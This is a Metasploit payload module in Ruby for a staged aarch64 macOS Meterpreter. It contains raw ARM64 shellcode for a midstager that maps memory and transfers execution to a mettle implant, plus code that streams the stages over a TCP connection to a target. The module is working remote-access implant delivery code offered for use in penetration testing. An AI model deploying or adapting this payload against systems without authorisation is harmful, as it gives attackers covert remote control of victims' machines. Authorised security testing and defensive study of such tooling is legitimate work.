##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OSX Meterpreter',
        'Description' => 'Inject the mettle server payload (staged)',
        'Platform' => 'osx',
        'Author' => [
          'parchedmind',  # osx_runbin
          'nologic',      # shellcc
          'timwr',        # metasploit integration
          'usiegl00'      # aarch64
        ],
        'References' => [
          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],
          [ 'URL', 'https://github.com/nologic/shellcc' ]
        ],
        'Arch' => ARCH_AARCH64,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_aarch64_OSX,
        'Convention' => 'sockedi'
      )
    )
  end

  def handle_intermediate_stage(conn, payload)
    stager_file = File.join(Msf::Config.data_directory, 'meterpreter', 'aarch64_osx_stage')
    data = File.binread(stager_file)
    macho = Msf::Payload::MachO.new(data)
    output_data = macho.flatten
    entry_offset = macho.entrypoint
    # external/source/shellcode/osx/aarch64/stage_mettle.s
    midstager = [
      0xaa1f03e0,
      0x10000861,
      0xf9400021,
      0xd2800042,
      0xd2820043,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000870,
      0xd4000001,
      0xaa0003ea,
      0xaa0d03e0,
      0xaa0a03e1,
      0x10000702,
      0xf9400042,
      0xd2800803,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000770,
      0xd4000001,
      0xaa0a03e0,
      0x10000601,
      0xf9400021,
      0xd28000a2,
      0x580006f0,
      0xd4000001,
      0xaa1f03e0,
      0x10000581,
      0xf9400021,
      0xd2800062,
      0xd2820043,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000550,
      0xd4000001,
      0xaa0003eb,
      0xaa0d03e0,
      0xaa0b03e1,
      0x10000422,
      0xf9400042,
      0xd2800803,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000450,
      0xd4000001,
      0x10000380,
      0xf9400000,
      0x8b0a0000,
      0x100002ea,
      0xf940014a,
      0xaa0b03ec,
      0xaa0003ef,
      0xaa1f03e0,
      0xd2a00081,
      0xd2800062,
      0xd2820043,
      0xaa1f03e4,
      0xaa1f03e5,
      0x58000230,
      0xd4000001,
      0x91408000,
      0x9100001f,
      0xaa0d03e0,
      0xd63f01e0,
      0xd2800000,
      0x58000210,
      0xd4000001,
      0xd503201f,
      0xd503201f,
      output_data.length,
      0x00000000,
      payload.length,
      0x00000000,
      entry_offset,
      0x00000000,
      0x020000c5,
      0x00000000,
      0x0200001d,
      0x00000000,
      0x0200004a,
      0x00000000,
      0x02000001,
      0x00000000
    ].pack('V*')
    print_status("Transmitting first stager...(#{midstager.length} bytes)")
    conn.put(midstager)
    midstager.length

    Rex.sleep(0.1)
    print_status("Transmitting second stager...(#{output_data.length} bytes)")
    conn.put(output_data) == output_data.length
  end

  def generate_stage(opts = {})
    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))
    mettle_macho = MetasploitPayloads::Mettle.new('aarch64-apple-darwin',
                                                  generate_config(opts.merge(config_opts))).to_binary :exec
    mettle_macho[0] = 'b'
    mettle_macho
  end
end
